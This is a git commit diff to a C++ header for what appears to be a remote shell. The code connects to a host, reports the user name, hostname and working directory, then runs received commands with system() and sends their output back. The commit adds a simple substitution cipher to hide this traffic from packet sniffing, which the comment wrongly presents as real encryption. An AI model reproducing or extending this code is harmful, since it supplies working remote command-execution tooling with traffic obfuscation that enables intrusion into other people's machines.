0a1b4cdda44c1eb35b8044de5c2400a15849612b
Amir <amircpro@gmail.com>
2020-05-07 11:30:51 +0100

    Update shsecond.hpp

--- shsecond.hpp
+++ shsecond.hpp
@@ -8,6 +8,7 @@
 #include <string>
 #include <sys/time.h>
 #include <thread>
+#include <map>
 
 //NETWORKING
 #include <unistd.h>
@@ -22,6 +23,57 @@ struct secondsh{
     int bytes_red = 0;
     int bytes_written = 0;
     int global_socket;
+
+    std::string alphabet = "abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    std::string str = "gjewklmzusnvqpycthrifxbdao DWKISFOGNUQZXBYCEVRLMAHPJT6547812390";
+
+    // this encryption method is designed to provide a basic layer of security against packet sniffing
+    // without encryption everyone could see the data sent (which includes password)
+    std::string ncrypt(std::string target){
+        std::string encrypted;
+        std::map <char, char> nmap;
+        int pos = 0;
+
+        for(char c : alphabet){
+            nmap[c] = str.at(pos);
+            pos++;
+            
+        }
+        const char* quote = "'";
+        for(char l : target){
+            if((int) nmap[l] == 0 && l != *quote){encrypted.push_back(l);}
+
+            else{encrypted.push_back(nmap[l]);}
+            
+        }
+        return encrypted;
+
+    }
+
+    std::string dcrypt(std::string target){
+        std::string decrypted;
+        std::map <char, char> nmap;
+        int pos = 0;
+
+        for(char c : str){
+            nmap[c] = alphabet.at(pos);
+            pos++;
+            
+        }
+
+        const char* quote = "'";
+        for(char l : target){
+
+            if((int)l == 0){decrypted.push_back(*quote);}
+
+            else if((int) nmap[l] == 0){decrypted.push_back(l);}
+            
+            else{decrypted.push_back(nmap[l]);} 
+        }
+
+        return decrypted;
+    
+    }
 
     std::string system_output(std::string cmd) {
         std::string data;
@@ -47,13 +99,6 @@ struct secondsh{
         std::this_thread::sleep_for(duration);
     }
 
-    void send_bytes(int* socketptr, std::string buffer){
-        char temp[buffer.length()+1];
-        strcpy(temp, buffer.c_str());
-
-        bytes_written += send(*(socketptr), (char*)&temp, strlen(temp), 0);
-    }
-
     int* connect_socket(unsigned int PORT, const std::string hostname){
         char buffer[1500];
 
@@ -77,17 +122,18 @@ struct secondsh{
         struct timeval start1, end1;
         gettimeofday(&start1, NULL);
 
-        std::string whoami = system_output("whoami");
+        std::string whoami = ncrypt(system_output("whoami"));
+
         memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
         strcpy(buffer, whoami.c_str());
         bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);
 
-        std::string chostname = system_output("hostname");
+        std::string chostname = ncrypt(system_output("hostname"));
         memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
         strcpy(buffer, chostname.c_str());
         bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);
 
-        std::string current_dir = system_output("echo $PWD");
+        std::string current_dir = ncrypt(system_output("echo $PWD"));
         memset(&buffer, 0x00, sizeof(buffer));
         strcpy(buffer, current_dir.c_str());
         bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0); //sending current_dir
@@ -104,6 +150,11 @@ struct secondsh{
             int read = recv(global_socket, (char*)&buffer, sizeof(buffer), 0); // read command
             bytes_red += read;
 
+            // decrypt buffer
+            std::string newbuff = dcrypt(std::string(buffer));
+            memset(&buffer, 0x00, sizeof(buffer));
+            strcpy(buffer, newbuff.c_str());
+
             std::string s_buffer = std::string(buffer);
             std::string token = s_buffer.substr(0, s_buffer.find(" "));
             
@@ -119,8 +170,9 @@ struct secondsh{
             
             system(buffer);
             std::string cmd_out = system_output(std::string(buffer));
+            std::string crypt_out = ncrypt(cmd_out);
             //std::cout << buffer << std::endl;
-            strcpy(buffer, cmd_out.c_str());
+            strcpy(buffer, crypt_out.c_str());
             bytes_written += send(global_socket, (char*)&buffer, strlen(buffer)+1, 0);
      
         }
